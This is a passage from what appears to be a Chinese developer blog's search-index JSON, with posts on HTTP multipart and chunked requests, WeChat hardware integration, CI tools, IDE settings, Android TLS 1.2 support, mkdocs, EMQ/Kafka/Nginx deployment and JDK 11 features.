6e74656e742d547970653a20746578742f706c61696e0d0a0d0a31323334350d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d3434333030383135343031323939313231303034383239360d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d226465736372696265220d0a0d0a7468697320697320746578740d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d3434333030383135343031323939313231303034383239362d2d0d0a485454502f312e3120323030200d0a436f6e74656e742d547970653a20746578742f706c61696e3b636861727365743d5554462d380d0a436f6e74656e742d4c656e6774683a20320d0a446174653a205361742c2032322044656320323031382030393a33383a313420474d540d0a0d0a4f4b 值得注意的一个地方就是 boundary ，postman和大多数浏览器都是用 --------- 开头作为boundary 的值，而我们参照它来拼包时，很容易忘记分隔符是 -- + boundary 。 比如上面 postman 定义了 boundary 的值为 --------------------------443008154012991210048296 （26个 - ）， 而分割符的值是 ----------------------------443008154012991210048296 （28个 - ）。 但其实只有保证整个包内出现和 boundary 相同的内容即可，我们重新定义一个没有 - 的值： 123456...content-type: multipart/form-data; boundary=fe1f62da7dbc44bea38db39dbf07413b--fe1f62da7dbc44bea38db39dbf07413bContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;hello.txt&quot;... 这样就可以了。","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"深入解析HTTP--Chunk分块发送","slug":"前端/深入解析HTTP--Chunk分块发送","date":"2018-12-21T11:52:36.000Z","updated":"2021-12-28T03:24:10.259Z","comments":true,"path":"前端/深入解析HTTP--Chunk分块发送/","link":"","permalink":"http://yoursite.com/前端/深入解析HTTP--Chunk分块发送/","excerpt":"","text":"需求分块传输编码（Chunked transfer encoding）是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由网页服务器发送给客户端应用（ 通常是网页浏览器）的数据可以分成多个部分。分块传输编码只在HTTP协议1.1版本（HTTP/1.1）中提供。 客户端给服务器发送数据也一样可以使用 Chunk 传输，比如，客户端要上传数据，但是数据没有完全生成，通过chunk分块传输，就可以一边生成数据一边上传，典型的比如：上传录音。 服务端接收数据12345@PostMapping(value = \"/upload\")public String upload(@RequestBody byte[] body)&#123; return \"PONG:\"+body.length;&#125; postman一次发送body，如下图： 客户端分块发送 chunk 需要加入头：Transfer-Encoding: chunked 每个 chunk 块的格式都是：[chunk size][CRLF][chunk data][CRLF] 结束 chunk 块是0，也就是：[0][CRLF][CRLF] 举例： 发送一个请求，body 内容为 12HELLO，其中 12 是一个 chunk 包，HELLO是一个 chunk 包。 分块请求体： 1234567891011POST /test/upload HTTP/1.1\\r\\nHost: 192.168.0.223:7878\\r\\nConnection: keep-alive\\r\\nContent-Type: text/plain\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n2\\r\\n12\\r\\n5\\r\\nHELLO\\r\\n0\\r\\n\\r\\n 原始数据：123456789101112504f5354202f746573742f75706c6f616420485454502f312e310d0a486f73743a203139322e3136382e302e3232333a373837380d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a5472616e736665722d456e636f64696e673a206368756e6b65640d0a0d0a320d0a31320d0a350d0a48454c4c4f0d0a300d0a0d0a","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"微信硬件平台接入","slug":"微信公众平台接口/微信硬件平台接入","date":"2018-12-12T13:01:01.000Z","updated":"2018-12-12T13:01:01.000Z","comments":true,"path":"微信公众平台接口/微信硬件平台接入/","link":"","permalink":"http://yoursite.com/微信公众平台接口/微信硬件平台接入/","excerpt":"","text":"微信硬件平台方案假如我们要有一个WiFi硬件产品，已经有与自己的服务器通讯的私有协议，现在要接入到微信公众号平台，那将如何选择对接方案呢？ 《微信硬件平台》 有两大类接入方案：微信硬件云标准接入方案 和 平台基础接入方案。 调试工具 微信公众平台接口调试工具 注意：此处已认为你已对接完成微信公众平台，比如已经能接收微信平台的文本消息等，并且已经开启“设备功能”。 名称约定设备：这里指WiFi设备，跟微信没有近场通讯的功能。 硬件云：我们的服务器 微信云：微信公众号平台的服务器，推送的是xml格式消息 微信IoT云（微信硬件云）：微信硬件平台的服务器，推送json格式消息 以下 “我们的服务器” 统一称为 “服务器” 一、平台基础接入方案 摘录微信：设备不对接微信硬件云，设备消息将以xml格式发送到开发者在 公众平台/基本配置 填写的服务器地址。可以使用连接、消息接收等基础能力，但将不具备微信硬件平台制定的产品标准能力。 这种方案相对简单，微信云 将消息以普通的消息（如文本消息，xml格式）一样推送到服务器。 注意：不需要在 设备功能-设置 配置服务器URL。 我们使用 调试工具 的来模拟 微信云 推送过来的消息，选择 接口类型：使用硬件接入消息接口调试 ，里面有4个接口： 设备向后台发送数据 这个接口是指：设备通过微信和服务器通信，并且接收服务器的响应。指的应该是 近场通讯 ，忽略。 请求绑定消息 这应该是过期的接口，在文档上没找到，忽略。 绑定、解绑消息 这个接口非常重要，用户扫码绑定设备或者解除绑定，微信云 都会推送到服务器，服务器可以进行关系的绑定和解除。 WiFi设备连接状态订阅、退订消息 这个是状态（如在线、离线），用户在微信上需要知道设备的状态，所以 微信云 需要向服务器订阅状态，微信云推送订阅消息时，服务器需响应设备的状态数据，当设备的状态改变时，需主动将状态数据发送给 微信云 。 其中，设备向后台发送数据 的消息类型是device_text ，其他三个是 device_event 。如绑定事件消息： 123456789101112&lt;xml&gt; &lt;ToUserName&gt;&lt;![CDATA[gh_44d240793a14]]&gt;&lt;/ToUserName&gt; &lt;FromUserName&gt;&lt;![CDATA[oQyEgw2RrBdvRkFm-X2dTCcDlT8I]]&gt;&lt;/FromUserName&gt; &lt;CreateTime&gt;1544586669&lt;/CreateTime&gt; &lt;MsgType&gt;&lt;![CDATA[device_event]]&gt;&lt;/MsgType&gt; &lt;Event&gt;&lt;![CDATA[bind]]&gt;&lt;/Event&gt; &lt;DeviceType&gt;&lt;![CDATA[gh_44d240793a14]]&gt;&lt;/DeviceType&gt; &lt;DeviceID&gt;&lt;![CDATA[RSJMPLUG00002223]]&gt;&lt;/DeviceID&gt; &lt;Content&gt;&lt;![CDATA[]]&gt;&lt;/Content&gt; &lt;SessionID&gt;0&lt;/SessionID&gt; &lt;OpenID&gt;&lt;![CDATA[oQyEgw2RrBdvRkFm-X2dTCcDlT8I]]&gt;&lt;/OpenID&gt;&lt;/xml&gt; 总结：该方案利用绑定、解绑事件实现了用户和设备的绑定，应用场景即可根据需求开展。 举例：我的设备是一块 微信相框 ，在公众号上发送一张照片，微信云 推送到服务器，服务器通讯绑定关系，将照片通过自己定义的通讯协议推送给微信相框，微信相框就可以把照片显示出来了。 二、微信硬件云标准接入方案 摘录微信：若选择该方案，设备消息将以 Json 格式发送到开发者在 设备功能/设置 填写的服务器地址该方案的产品可拥有微信硬件平台制定的产品标准能力，实现设备互联与数据互通。 设备直连微信硬件云通道 摘录微信：设备可通过微信硬件平台提供的直连SDK，直接与微信硬件云对接 这部分是硬件直接连接微信云，不需要自己搭建服务器了，不是我们要对接的部分，省略。 厂商云连接微信硬件云通道 摘录微信：设备连接厂商服务器后，可通过设备 openAPI 与微信硬件云对接。 这种方案用的比较多，大部分产商都是用此方案。该方案要在 设备功能/设置 配置服务器URL，这个URL一样需要验证，但是接收的数据将不是 xml 格式，而是 json 格式，所以这个URL最好和 公众平台/基本配置 的不一样。 调试工具 没有测试 微信IoT云 推送事件的功能，只有测试 服务器 通知 微信IoT云 的接口。 不过没关系，我们先配置好服务器URL，进入”设备功能”，点击”添加产品” 添加一个产品，通过 调试工具 生成一个设备ID二维码，用微信扫描，直接绑定设备，就能收到推送事件。 扫码绑定 通知消息格式（解绑相同）： 1234567891011&#123; \"device_id\": \"xxxxx\", \"device_type\": \"xxxxxx\", \"msg_id\": 657728900, \"msg_type\": \"bind\", \"create_time\": 1544600955, \"open_id\": \"xxxxx\", \"session_id\": 0, \"content\": \"\", \"qrcode_suffix_data\": \"xxxxxxx==\"&#125; 接收到事件之后，需要异步处理，这一点和 平台基础接入方案 的阻塞处理不同。假如收到绑定事件，要立刻响应结果（内容不重要），服务器在处理完绑定事件之后，需要发送一个POST请求到 微信IoT云 ，告诉它我们服务器处理的结果。 这里只接受绑定和解绑的事件，功能其实和 平台基础接入方案 一样。 另外这个方案主要是使用 《微信硬件平台设备端OpenAPI》 ，这个东西的作用就是：微信IoT云 和 设备 通信，而通信的中间人就是我们在 设备功能/设置 填入的URL 服务器 。 通信都是异步方式，类型分为三类： 微信IoT云 向服务器查询设备消息 微信IoT云 向服务器设置设备消息 服务器通知微信IoT云消息 《微信硬件设备于端数据接口》 方案选择如果不需要用到 OpenAPI 的话，其实厂商云连接微信硬件云通道 和 平台基础接入方案 都可以，只需要绑定关系即可，厂商云连接微信硬件云通道 的功能更加强大。","categories":[{"name":"微信公众平台","slug":"微信公众平台","permalink":"http://yoursite.com/categories/微信公众平台/"}],"tags":[{"name":"微信公众平台","slug":"微信公众平台","permalink":"http://yoursite.com/tags/微信公众平台/"}]},{"title":"Jenkins 介绍","slug":"持续集成CI/Jenkins 使用介绍","date":"2018-12-11T13:32:36.000Z","updated":"2021-12-28T03:24:10.291Z","comments":true,"path":"持续集成CI/Jenkins 使用介绍/","link":"","permalink":"http://yoursite.com/持续集成CI/Jenkins 使用介绍/","excerpt":"","text":"Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具。Jenkins非常灵活，不过需要自己部署服务器，功能非常强大。可以通过配置插件，实现各种项目的 编译 - 打包 - 部署 等一条龙服务工作。 ……篇幅较长，还是看别人的吧 《搭建jenkins实现自动化部署》","categories":[{"name":"持续集成CI","slug":"持续集成CI","permalink":"http://yoursite.com/categories/持续集成CI/"}],"tags":[]},{"title":"Travis-CI 使用介绍","slug":"持续集成CI/Travis-CI 使用介绍","date":"2018-12-11T13:32:36.000Z","updated":"2021-12-28T03:24:10.291Z","comments":true,"path":"持续集成CI/Travis-CI 使用介绍/","link":"","permalink":"http://yoursite.com/持续集成CI/Travis-CI 使用介绍/","excerpt":"","text":"travis-ci 是在线托管的CI服务，用Travis来进行持续集成，不需要自己搭服务器，使用方便，对Github开源项目是免费的，支持多数主流语言。 使用 登录Travis官网 ，用Github账号登录。 首次登录，授权给Travis访问你的GitHub代码库 把需要CI的项目（UIAutomatorTest）勾选上 点击 “hebbely/UiAutomatorTest”，进入该项目”More Options”-“Setting” ，打开选项”Build ..yml” 和 “Build pushed branches” 添加.travis.yml 12345678910language: javajdk: - oraclejdk8script: \"mvn clean package -Dmaven.test.skip=true\"branches: only: - masternotifications: email: - xxx@qq.com","categories":[{"name":"持续集成CI","slug":"持续集成CI","permalink":"http://yoursite.com/categories/持续集成CI/"}],"tags":[]},{"title":"EditorConfig使用介绍","slug":"IDE/EditorConfig使用介绍","date":"2018-12-11T12:52:36.000Z","updated":"2021-12-28T03:24:10.132Z","comments":true,"path":"IDE/EditorConfig使用介绍/","link":"","permalink":"http://yoursite.com/IDE/EditorConfig使用介绍/","excerpt":"","text":"在github看到很多项目根目录都有 .editorconfig 文件，所以去了解一下。 这个文件是 EditorConfig 用来统一不同编辑器的代码风格的配置。 各种IDE的风格自然不一样，通过这样一个配置文件定义的标准统一风格，比如缩进用x个空格。再有就是多人一起协同开发一个项目，editorconfig 能起到很好的效果。 示例：1234567891011121314# EditorConfig: http://editorconfig.org/root = true[*]indent_style = spaceindent_size = 4end_of_line = lfcharset = utf-8trim_trailing_whitespace = trueinsert_final_newline = true[*.md]trim_trailing_whitespace = false","categories":[{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/categories/IDE/"}],"tags":[]},{"title":"搜索过滤掉某网站","slug":"随笔/搜索过滤掉某网站","date":"2018-12-11T11:23:36.000Z","updated":"2021-12-28T03:24:10.309Z","comments":true,"path":"随笔/搜索过滤掉某网站/","link":"","permalink":"http://yoursite.com/随笔/搜索过滤掉某网站/","excerpt":"","text":"自己搜索的内容含有 csdn.net 的，但这个网站要登录才能看，所以这些搜索结果是无用的，所以要过滤掉这些无用的结果。如某搜索，这样搜索：关键字 -site:csdn.net 就是过滤掉 csdn.net 的搜索结果。","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[]},{"title":"idea插件","slug":"IDE/idea插件","date":"2018-12-09T13:52:36.000Z","updated":"2021-12-28T03:24:10.136Z","comments":true,"path":"IDE/idea插件/","link":"","permalink":"http://yoursite.com/IDE/idea插件/","excerpt":"","text":"实用的插件，idea默认没有带的，自己可以安装。 .ignore可以帮助你创建相关项目的.gitignore文件 GsonFormat快速生成JSON类 2021-11-11:今天发现插件市场搜不到这个插件了，只有一个 GsonFormat-Plus（功能更加多，基于GsonFormat开发，作者也不同），感觉还是GsonFormat好用，可以手动下载安装：https://plugins.jetbrains.com/plugin/7654-gsonformat/versions 最后更新是2017年。 LombokLombok注解","categories":[{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/categories/IDE/"}],"tags":[]},{"title":"IDEA设置","slug":"IDE/idea设置","date":"2018-12-09T12:52:36.000Z","updated":"2021-12-28T03:24:10.137Z","comments":true,"path":"IDE/idea设置/","link":"","permalink":"http://yoursite.com/IDE/idea设置/","excerpt":"","text":"启动默认不打开项目Appearance &amp; Behavior –System Setting – Reopen last project on startup terminalshell path 设置为 git 安装路径的/bin/bash.exe keymapeclipse Appearance &amp; Behavior – path variablesMAVEN_REPOSITORY 设置到其他盘 Font字体 DejaVu Sans Mono 字号14 段距 1.1 注释不在行首Code Style - Java：取消勾选 Comment Code 没有显示 Git Local Changes2020.x新版的IDEA(包括Android Studio)默认Git Gui只显示Log项，而没有显示Local Changes。 Settings - Version Control - Commit ，取消勾选 Use non-modal commit interface 选项。 codeStyleConfig.xml.idea/codeStyles/codeStyleConfig.xml 使用IDEA默认的配置12345&lt;component name=\"ProjectCodeStyleConfiguration\"&gt; &lt;state&gt; &lt;option name=\"PREFERRED_PROJECT_CODE_STYLE\" value=\"Default\" /&gt; &lt;/state&gt;&lt;/component&gt;","categories":[{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/categories/IDE/"}],"tags":[]},{"title":"网站文档Slate","slug":"docs文档工具/网站文档Slate","date":"2018-12-06T11:52:36.000Z","updated":"2021-12-28T03:24:10.228Z","comments":true,"path":"docs文档工具/网站文档Slate/","link":"","permalink":"http://yoursite.com/docs文档工具/网站文档Slate/","excerpt":"","text":"Slate 可帮助您创建美观，智能，响应式的 API 文档 要Ruby环境，用markdown编写文档。使用方法看官方文档 预览图：","categories":[{"name":"docs文档工具","slug":"docs文档工具","permalink":"http://yoursite.com/categories/docs文档工具/"}],"tags":[{"name":"docs","slug":"docs","permalink":"http://yoursite.com/tags/docs/"}]},{"title":"Android4.x不能用SSL-TLS1.2","slug":"Android/Android4.x不能用SSL-TLS1.2","date":"2018-12-04T11:52:36.000Z","updated":"2021-12-28T03:24:10.113Z","comments":true,"path":"Android/Android4.x不能用SSL-TLS1.2/","link":"","permalink":"http://yoursite.com/Android/Android4.x不能用SSL-TLS1.2/","excerpt":"","text":"目前Android4.x也算是老设备了，今天做的一个项目访问客户的 HTTPS 服务器，在Android4.x一直抛异常 1javax.net.ssl.SSLException: Connection closed by peer 这是由于 Android4.x 默认关闭 TLS 的支持和 OkHTTP3.x 的问题，这个问题的讨论在于 issues/2372 。 解决这个问题有两个大方向： 服务器配置兼容支持TLS1.0、TLS1.1、TLS1.2，这样客户端就不需要做任何处理，完美兼容 Android端开启TLS1.2支持 Android端解决服务器不是我们的，只好从Android端入手。参考 issues/2372 的解决版本，摘取如下： 添加一个 Tls12SocketFactory.java 类： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import java.io.IOException;import java.net.InetAddress;import java.net.Socket;import java.net.UnknownHostException;import javax.net.ssl.SSLSocket;import javax.net.ssl.SSLSocketFactory;/** * Enables TLS v1.2 when creating SSLSockets. * &lt;p/&gt; * For some reason, android supports TLS v1.2 from API 16, but enables it by * default only from API 20. * @link https://developer.android.com/reference/javax/net/ssl/SSLSocket.html * @see SSLSocketFactory */public class Tls12SocketFactory extends SSLSocketFactory &#123; private static final String[] TLS_V12_ONLY = &#123;\"TLSv1.2\"&#125;; final SSLSocketFactory delegate; public Tls12SocketFactory(SSLSocketFactory base) &#123; this.delegate = base; &#125; @Override public String[] getDefaultCipherSuites() &#123; return delegate.getDefaultCipherSuites(); &#125; @Override public String[] getSupportedCipherSuites() &#123; return delegate.getSupportedCipherSuites(); &#125; @Override public Socket createSocket(Socket s, String host, int port, boolean autoClose) throws IOException &#123; return patch(delegate.createSocket(s, host, port, autoClose)); &#125; @Override public Socket createSocket(String host, int port) throws IOException, UnknownHostException &#123; return patch(delegate.createSocket(host, port)); &#125; @Override public Socket createSocket(String host, int port, InetAddress localHost, int localPort) throws IOException, UnknownHostException &#123; return patch(delegate.createSocket(host, port, localHost, localPort)); &#125; @Override public Socket createSocket(InetAddress host, int port) throws IOException &#123; return patch(delegate.createSocket(host, port)); &#125; @Override public Socket createSocket(InetAddress address, int port, InetAddress localAddress, int localPort) throws IOException &#123; return patch(delegate.createSocket(address, port, localAddress, localPort)); &#125; private Socket patch(Socket s) &#123; if (s instanceof SSLSocket) &#123; ((SSLSocket) s).setEnabledProtocols(TLS_V12_ONLY); &#125; return s; &#125;&#125; 在代码中加入以下方法： 123456789101112131415161718192021222324public static OkHttpClient.Builder enableTls12OnPreLollipop(OkHttpClient.Builder client) &#123; if (Build.VERSION.SDK_INT &gt;= 16 &amp;&amp; Build.VERSION.SDK_INT &lt; 22) &#123; try &#123; SSLContext sc = SSLContext.getInstance(\"TLSv1.2\"); sc.init(null, null, null); client.sslSocketFactory(new Tls12SocketFactory(sc.getSocketFactory())); ConnectionSpec cs = new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS) .tlsVersions(TlsVersion.TLS_1_2) .build(); List&lt;ConnectionSpec&gt; specs = new ArrayList&lt;&gt;(); specs.add(cs); specs.add(ConnectionSpec.COMPATIBLE_TLS); specs.add(ConnectionSpec.CLEARTEXT); client.connectionSpecs(specs); &#125; catch (Exception exc) &#123; Log.e(\"OkHttpTLSCompat\", \"Error while setting TLS 1.2\", exc); &#125; &#125; return client;&#125; 对 OkHttpClient 实例进行处理，如结合 Retrofit 使用如下： 12345678OkHttpClient.Builder builder = new OkHttpClient.Builder();//...builder conf//...OkHttpClient client = enableTls12OnPreLollipop(builder).build();Retrofit retrofit = new Retrofit.Builder() .baseUrl(BASE_URL) .client() .build();","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"SSL","slug":"SSL","permalink":"http://yoursite.com/tags/SSL/"}]},{"title":"网站文档mkdocs","slug":"docs文档工具/网站文档mkdocs","date":"2018-12-04T11:52:36.000Z","updated":"2021-12-28T03:24:10.230Z","comments":true,"path":"docs文档工具/网站文档mkdocs/","link":"","permalink":"http://yoursite.com/docs文档工具/网站文档mkdocs/","excerpt":"","text":"mkdocs.org 安装12345671. 安装python2.7（安装时选中加入环境变量）2. pip install mkdocs &amp; mkdocs --version3. pip install click-man4. mkdocs new my-project &amp; cd my-project5. mkdocs serve6. mkdocs build7. mkdocs build --clean (清理已被删除的文档所生成的html文件) mkdocs-material主题配置点击看效果 mkdocs-material 121. pip install mkdocs-material2. vim mkdocs.yml mkdocs.yml 配置示例： 123456789site_name: 文档中心theme: name: 'material' palette: primary: 'teal' accent: 'teal' font: text: 'Roboto' code: 'Roboto Mono' 常用命令 mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs help - Print this help message. 项目结构1234mkdocs.yml # The configuration file.docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files. 效果","categories":[{"name":"docs文档工具","slug":"docs文档工具","permalink":"http://yoursite.com/categories/docs文档工具/"}],"tags":[{"name":"docs","slug":"docs","permalink":"http://yoursite.com/tags/docs/"}]},{"title":"EMQ阿里云集群部署","slug":"Web后端/EMQ阿里云集群部署","date":"2018-11-19T11:52:36.000Z","updated":"2021-12-28T03:24:10.201Z","comments":true,"path":"Web后端/EMQ阿里云集群部署/","link":"","permalink":"http://yoursite.com/Web后端/EMQ阿里云集群部署/","excerpt":"","text":"环境和实现效果： 两台阿里云服务器做集群 服务器 1 (主)：内网（10.0.0.1）外网（118.0.0.1）服务器 2 (从)：内网（10.0.0.2）外网（118.0.0.2） 安装emq 12$ wget https://www.emqx.io/static/brokers/emqttd-ubuntu16.04-v2.3.11.zip$ unzip emqttd-ubuntu16.04-v2.3.11.zip 配置 1234$ vim emqttd/etc/emq.confnode.name = emq@内网IP mqtt.allow_anonymous = false 系统调优 切换到root账号操作比较方便 12345678910$ vim /etc/security/limits.confubuntu soft nofile 65535ubuntu hard nofile 65535root soft nofile 65535root hard nofile 65535* soft nofile 65536* hard nofile 65536* soft nproc 102400* soft memlock unlimited* hard memlock unlimited 1234$ sysctl -w fs.file-max=2097152$ sysctl -w fs.nr_open=2097152$ echo 2097152 &gt; /proc/sys/fs/nr_open$ ulimit -n 1048576 1234$ vim /etc/sysctl.conffs.file-max = 1048576$ vim /etc/systemd/system.confDefaultLimitNOFILE=1048576 1234567891011sysctl -w net.core.somaxconn=32768sysctl -w net.ipv4.tcp_max_syn_backlog=16384sysctl -w net.core.netdev_max_backlog=16384sysctl -w net.ipv4.ip_local_port_range=&apos;1000 65535&apos;sysctl -w net.core.rmem_default=262144sysctl -w net.core.wmem_default=262144sysctl -w net.core.rmem_max=16777216sysctl -w net.core.wmem_max=16777216sysctl -w net.core.optmem_max=16777216sysctl -w net.ipv4.tcp_rmem=&apos;1024 4096 16777216&apos;sysctl -w net.ipv4.tcp_wmem=&apos;1024 4096 16777216&apos; 加入集群 12345# 以root账号运行$ ./bin/emqttd start# 在节点运行$ ./bin/emqttd_ctl cluster join emq@10.0.0.1 退出集群 12345#本节点退出集群$ ./bin/emqttd_ctl cluster leave#从集群删除其他节点$ ./bin/emqttd_ctl cluster remove emq@s2.emqtt.io 负载均衡 省略","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"Kafka安装部署","slug":"Web后端/Kafka安装部署","date":"2018-11-01T11:52:36.000Z","updated":"2021-12-28T03:24:10.202Z","comments":true,"path":"Web后端/Kafka安装部署/","link":"","permalink":"http://yoursite.com/Web后端/Kafka安装部署/","excerpt":"","text":"环境和实现效果： 一台虚拟机安装Kafka 本地基于SpringBoot使用Kafka Client 安装zookeeper12345root@bogon:~# wget http://mirror.bit.edu.cn/apache/zookeeper/zookeeper-3.4.13/zookeeper-3.4.13.tar.gzroot@bogon:~# tar zxf zookeeper-3.4.13.tar.gzroot@bogon:~/zookeeper-3.4.13/conf# cp zoo_sample.cfg zoo.cfgroot@bogon:~/zookeeper-3.4.13/conf# cd ../bin/root@bogon:~/zookeeper-3.4.13/bin# ./zkServer.sh start 安装Kafka1234root@bogon:~# wget http://mirrors.cnnic.cn/apache/kafka/2.0.0/kafka_2.12-2.0.0.tgzroot@bogon:~# tar zxf kafka_2.12-2.0.0.tgzroot@bogon:~# cd kafka_2.12-2.0.0/bin/root@bogon:~/kafka_2.12-2.0.0/bin# ./kafka-server-start.sh ../config/server.properties &amp; 验证端口123root@bogon:~# netstat -tunlp|egrep \"(2181|9092)\"tcp 0 0 0.0.0.0:9092 0.0.0.0:* LISTEN 38349/java tcp 0 0 0.0.0.0:2181 0.0.0.0:* LISTEN 37342/java 测试生产者 1root@bogon:~# ./kafka-console-producer.sh --broker-list localhost:8086 --topic test 消费者 12root@bogon:~# ./kafka-console-consumer.sh --bootstrap-server localhost:8086 --topic test --from-beginning&gt;输入消息，回车发送 修改配置Ubuntu 的 /etc/hosts 文件的配置会导致 Client 连接失败，所以在 Kafka 的 server.properties 文件加入HostName 1host.name = 192.168.0.223 云部署在阿里云上部署时，外网会有端口限制，所以要先确保9092端口是开放的（我部署时9092没开，没有权限开放，只有改为8086） 场景： Kafka独立部署 生产者和消费者在另外一台服务器 本地调试 端口虽然开放了，但是要做内网/外网远程连接，本地还是连接不了Kafka，用命令 telnet IP PORT 测试连接。 我内网虚拟机部署的Kafka没有此问题 例如：我的阿里云主机外网IP为：10.8.7.0 ，在 kafka/config/server.properties 加入以下配置 1234port=8086listeners=PLAINTEXT://0.0.0.0:8086advertised.listeners=PLAINTEXT://10.8.7.0:8086advertised.host.name=10.8.7.0.9","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"Nginx + EMQ负载均衡","slug":"Web后端/EMQ+Nginx负载均衡","date":"2018-10-24T11:52:36.000Z","updated":"2021-12-28T03:24:10.200Z","comments":true,"path":"Web后端/EMQ+Nginx负载均衡/","link":"","permalink":"http://yoursite.com/Web后端/EMQ+Nginx负载均衡/","excerpt":"","text":"环境和实现效果： 两台服务器安装EMQ实例监听1883端口（两个EMQ节点要做集群） 一台负载均衡服务器NGINX监听1883端口 客户端连接负载均衡服务器，连接分配到EMQ服务器。 1234567891011121314151617#TCP负载均衡stream &#123; upstream mqtt1883&#123; server 192.168.0.223:1883 weight=1; server 192.168.0.224:1883 weight=1; &#125; server &#123; listen 1883; #proxy_send_timeout 2h; #proxy_read_timeout 2h; #proxy_connect_timeout 150s; #proxy_timeout 150s; proxy_pass mqtt1883; proxy_buffer_size 3M; tcp_nodelay on; &#125;&#125; 节点加入集群：$ ./bin/emqttd_ctl cluster join emq@192.168.0.88","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"JDK 11 新特性","slug":"Java/JDK 11 新特性","date":"2018-09-25T11:51:39.000Z","updated":"2021-12-30T08:47:20.014Z","comments":true,"path":"Java/JDK 11 新特性/","link":"","permalink":"http://yoursite.com/Java/JDK 11 新特性/","excerpt":"","text":"2018年9月25日 JDK 11 发布，LTS 版本。 新特性 181: Nest-Based Access Control 309: Dynamic Class-File Constants 315: Improve Aarch64 Intrinsics 318: Epsilon: A No-Op Garbage Collector 320: Remove the Java EE and CORBA Modules 321: HTTP Client (Standard) 323: Local-Variable Syntax for Lambda Parameters 324: Key Agreement with Curve25519 and Curve448 327: Unicode 10 328: Flight Recorder 329: ChaCha20 and Poly1305 Cryptographic Algorithms 330: Launch Single-File Source-Code Programs 331: Low-Overhead Heap Profiling 332: Transport Layer Security (TLS) 1.3 333: ZGC: A Scalable Low-Latency Garbage Collector (Experimental) 335: Deprecate the Nashorn JavaScript Engine 336: Deprecate the Pack200 Tools and API 中文 181: 基于嵌套的访问控制 309: 动态类文件常量 315: 改进 Aarch64 Intrinsics 318: Epsilon: 一个无操作的垃圾收集器 320: 删除 Java EE and CORBA Modules 321: HTTP Client (Standard) 323: 用于 Lambda 参数的局部变量语法 324: 新增 Curve25519 and Curve448 算法的密钥协议 327: Unicode 10 328: 飞行记录器 Flight Recorder 329: ChaCha20 and Poly1305 加密算法 330: 启动单一文件的源代码程序 331: 低开销的 Heap Profiling 332: 支持 TLS 1.3 333: ZGC: 可伸缩低延迟垃圾收集器 335: 弃用 the Nashorn JavaScript Engine 336: 弃用 the Pack200 Tools and API 从这个版本开始，我已习惯用 oracle openjdk 了，由于2019年1月开始，Oracle JDK 会收取商用费用（参考：【Oracle要对JDK8收费】），openjdk 发展的更好了，虽然它也是Oracle的。 Java 11 已于 2018 年 9 月 25 日正式发布，与 Java 9 和 Java 10 这两个被称为”功能性的版本”不同，Java 11 仅将提供长期支持服务（LTS, Long-Term-Support），还将作为 Java 平台的默认支持版本，并且会提供技术支持直至 2023 年 9 月，对应的补丁和安全警告等支持将持续至 2026 年。 标准 HTTP Client 升级Java 11 对 Java 9 中引入并在 Java 10 中进行了更新的 Http Client API 进行了标准化，在前两个版本中进行孵化的同时，Http Client 几乎被完全重写，并且现在完全支持异步非阻塞。 新版 Java 中，Http Client 的包名由 jdk.incubator.http 改为 java.net.http，该 API 通过 CompleteableFutures 提供非阻塞请求和响应语义，可以联合使用以触发相应的动作，并且 RX Flow 的概念也在 Java 11 中得到了实现。现在，在用户层请求发布者和响应发布者与底层套接字之间追踪数据流更容易了。这降低了复杂性，并最大程度上提高了 HTTP / 1 和 HTTP / 2 之间的重用的可能性。 Java 11 中的新 Http Client API，提供了对 HTTP/2 等业界前沿标准的支持，同时也向下兼容 HTTP/1.1，精简而又友好的 API 接口，与主流开源 API（如：Apache HttpClient、Jetty、OkHttp 等）类似甚至拥有更高的性能。与此同时它是 Java 在 Reactive-Stream 方面的第一个生产实践，其中广泛使用了 Java Flow API，终于让 Java 标准 HTTP 类库在扩展能力等方面，满足了现代互联网的需求，是一个难得的现代 Http/2 Client API 标准的实现，Java 工程师终于可以摆脱老旧的 HttpURLConnection 了。下面模拟 Http GET 请求并打印返回内容： 清单 1. GET 请求示例12345678HttpClient client = HttpClient.newHttpClient();HttpRequest request = HttpRequest.newBuilder() .uri(URI.create(\"http://openjdk.java.net/\")) .build();client.sendAsync(request, BodyHandlers.ofString()) .thenApply(HttpResponse::body) .thenAccept(System.out::println) .join(); 简化启动单个源代码文件的方法Java 11 版本中最令人兴奋的功能之一是增强 Java 启动器，使之能够运行单一文件的 Java 源代码。此功能允许使用 Java 解释器直接执行 Java 源代码。源代码在内存中编译，然后由解释器执行。唯一的约束在于所有相关的类必须定义在同一个 Java 文件中。 此功能对于开始学习 Java 并希望尝试简单程序的人特别有用，并且能与 jshell 一起使用，将成为任何初学者学习语言的一个很好的工具集。不仅初学者会受益，专业人员还可以利用这些工具来探索新的语言更改或尝试未知的 API。 